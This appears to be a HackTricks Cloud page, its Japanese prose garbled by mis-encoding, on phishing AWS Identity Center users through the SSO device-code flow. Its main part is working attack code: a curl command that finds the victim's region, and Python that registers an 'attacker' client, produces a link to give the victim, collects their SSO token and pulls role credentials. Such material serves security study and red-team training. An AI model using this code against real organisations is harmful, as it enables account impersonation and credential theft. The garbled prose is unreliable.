# AWS - Identity Center & SSO Unauthenticated Enum

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚§ã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã¾ãŸã¯[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹
- **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[HackTricks](https://github.com/carlospolop/hacktricks)ã¨[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã™ã‚‹**

</details>

## AWSãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°

æœ€åˆã«[**ã“ã®ãƒ–ãƒ­ã‚°æŠ•ç¨¿**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)ã§ææ¡ˆã•ã‚ŒãŸæ–¹æ³•ã§ã€AWS SSOã‚’ä½¿ç”¨ã—ã¦**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãƒªãƒ³ã‚¯ã‚’é€ä¿¡**ã™ã‚‹ã“ã¨ã§ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæ‰¿èªã™ã‚‹ã¨**ã€æ”»æ’ƒè€…ã¯**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãªã‚Šã™ã¾ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹**ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**Identity Center**ã§ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã™ã¹ã¦ã®ãƒ­ãƒ¼ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã§ãã¾ã™ã€‚

ã“ã®æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«å¿…è¦ãªã‚‚ã®ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

- çŠ ç‰²è€…ã¯**Identity Center**ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™
- æ”»æ’ƒè€…ã¯ã€çŠ ç‰²è€…ãŒä½¿ç”¨ã—ã¦ã„ã‚‹**ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³** `<victimsub>.awsapps.com/start` ã‚’çŸ¥ã£ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™

å‰è¿°ã®æƒ…å ±ã ã‘ã§ã€**æ”»æ’ƒè€…ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãƒªãƒ³ã‚¯ã‚’é€ä¿¡**ã—ã€**æ‰¿èªã•ã‚Œã‚‹ã¨**ã€**æ”»æ’ƒè€…ã¯AWSãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹**ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

### æ”»æ’ƒ

1. **ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹**

æ”»æ’ƒè€…ã®æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€è¢«å®³è€…ä¼æ¥­ãŒIdentity Centerã§ä½¿ç”¨ã—ã¦ã„ã‚‹ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯ã€**OSINT**ã¾ãŸã¯**æ¨æ¸¬+BF**ã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚ã»ã¨ã‚“ã©ã®ä¼æ¥­ã¯ã“ã“ã§è‡ªç¤¾åã¾ãŸã¯ãã®ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒé«˜ã„ãŸã‚ã§ã™ã€‚

ã“ã®æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€Identity CenterãŒæ§‹æˆã•ã‚ŒãŸåœ°åŸŸã‚’å–å¾—ã§ãã¾ã™ï¼š
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **è¢«å®³è€…ç”¨ã®ãƒªãƒ³ã‚¯ã‚’ç”Ÿæˆã—ã¦é€ä¿¡ã™ã‚‹**

ä»¥ä¸‹ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã€è¢«å®³è€…ãŒèªè¨¼ã§ãã‚‹AWS SSOãƒ­ã‚°ã‚¤ãƒ³ãƒªãƒ³ã‚¯ã‚’ç”Ÿæˆã—ã¾ã™ã€‚\
ãƒ‡ãƒ¢ç”¨ã«ã€ã“ã®ã‚³ãƒ¼ãƒ‰ã‚’Pythonã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§å®Ÿè¡Œã—ã€å¾Œã§ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã„ãã¤ã‹ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒå¿…è¦ã«ãªã‚‹ãŸã‚ã€ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‚’çµ‚äº†ã—ãªã„ã§ãã ã•ã„ï¼š
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
3. **è¢«å®³è€…ãŒãã‚Œã‚’å—ã‘å…¥ã‚Œã‚‹ã®ã‚’å¾…ã¤**

è¢«å®³è€…ãŒ**ã™ã§ã«AWSã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹**å ´åˆã€æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ã‚’å—ã‘å…¥ã‚Œã‚‹ã ã‘ã§æ¸ˆã¿ã¾ã™ã€‚ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ãªã„å ´åˆã¯ã€**ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã‹ã‚‰æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚\
ã“ã‚ŒãŒç¾åœ¨ã®ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã®è¦‹ãŸç›®ã§ã™ï¼š

<figure><img src="../../../.gitbook/assets/image (154).png" alt="" width="311"><figcaption></figcaption></figure>

4. **SSOã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹**

è¢«å®³è€…ãŒãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã‚’å—ã‘å…¥ã‚ŒãŸå ´åˆã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¦**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãªã‚Šã™ã¾ã—ã¦SSOãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆ**ã—ã¾ã™ï¼š
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
SSOã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã¯**8æ™‚é–“æœ‰åŠ¹**ã§ã™ã€‚

5. **ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å½è£…ã™ã‚‹**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Phishing the unphisable MFA

å‰ã®æ”»æ’ƒãŒã€Œunphisable MFAã€ï¼ˆwebAuthã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã§ã‚‚ï¼‰æ©Ÿèƒ½ã™ã‚‹ã“ã¨ã‚’çŸ¥ã‚‹ã®ã¯æ¥½ã—ã„ã§ã™ã€‚ã“ã‚Œã¯ã€å‰ã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ãŒä½¿ç”¨ã•ã‚Œã‚‹OAuthãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’é›¢ã‚Œãªã„ãŸã‚ã§ã™ã€‚ä»–ã®ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°æ”»æ’ƒã¨ã¯ç•°ãªã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’ç½®ãæ›ãˆã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ãŒã€ã“ã®å ´åˆã€ãƒ‡ãƒã‚¤ã‚¹ã‚³ãƒ¼ãƒ‰ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ãŒæº–å‚™ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€ã‚³ãƒ¼ãƒ‰ãŒãƒ‡ãƒã‚¤ã‚¹ã«ã‚ˆã£ã¦çŸ¥ã‚‰ã‚Œã¦ãŠã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ç•°ãªã‚‹ãƒã‚·ãƒ³ã§ã‚‚ãƒ­ã‚°ã‚¤ãƒ³ã§ãã¾ã™ã€‚ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒå—ã‘å…¥ã‚Œã‚‰ã‚Œã‚‹ã¨ã€ãƒ‡ãƒã‚¤ã‚¹ã¯å˜ã«æœ€åˆã®ã‚³ãƒ¼ãƒ‰ã‚’çŸ¥ã£ã¦ã„ã‚‹ã ã‘ã§ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è³‡æ ¼æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€[**ã“ã®æŠ•ç¨¿ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„**](https://mjg59.dreamwidth.org/62175.html)ã€‚

### Automatic Tools

* [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
* [https://github.com/sebastian-mora/awsssome\_phish](https://github.com/sebastian-mora/awsssome\_phish)

## References

* [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
* [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
* [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
* [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã“ã¡ã‚‰ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></a><strong>!</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã‚Šã€**HackTricksã‚’åºƒå‘Šã™ã‚‹**ã“ã¨ãŒã§ãã‚‹å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[NFTs](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã—ãŸã‚Šã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹
* ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã™ã‚‹

</details>
